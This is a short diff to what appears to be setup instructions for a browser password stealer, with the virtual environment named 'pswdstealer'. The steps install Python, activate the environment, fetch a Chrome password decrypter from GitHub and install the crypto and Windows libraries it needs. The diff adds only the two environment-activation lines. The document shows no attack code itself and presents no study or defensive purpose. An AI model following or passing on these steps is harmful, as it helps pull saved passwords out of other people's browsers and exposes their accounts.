@@ -1,5 +1,7 @@
 Get python https://www.python.org/downloads/
 First off, python -m venv pswdstealer
+then in your directory go to the /Scripts/ Folder
+then do start activate.bat
 Get the decrypter from https://github.com/ohyicong/decrypt-chrome-passwords
 do "pip install pycryptodomex && pip install pycryptodome"
 do "pip install pywin32 && pip install sqlite" copy and paste.
